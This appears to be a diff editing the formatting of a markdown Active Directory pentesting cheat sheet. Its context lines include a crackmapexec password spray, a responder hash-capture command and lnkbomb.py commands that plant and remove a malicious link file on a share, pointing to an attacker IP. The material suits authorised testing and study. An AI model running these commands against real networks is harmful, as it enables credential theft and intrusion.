@@ -218,18 +218,19 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   ```bash
   responder -I eth0 --lm
   ```
-<details>
+ <details>
   <summary> lnkbomb </summary> 
+  
   ### Create a lnk file for a share with read/write rights
-
   ```bash
   python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows
   ```
+   
   ### Remove the lnk file
   ```basb
   python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows -r dicnwdsebl.url
   ```
-<details>
+</details>
   
   ### Crackmapexec NTLM-relay
   #### Evaluate no smb-signing and create an IP txt file for TLMRelayx
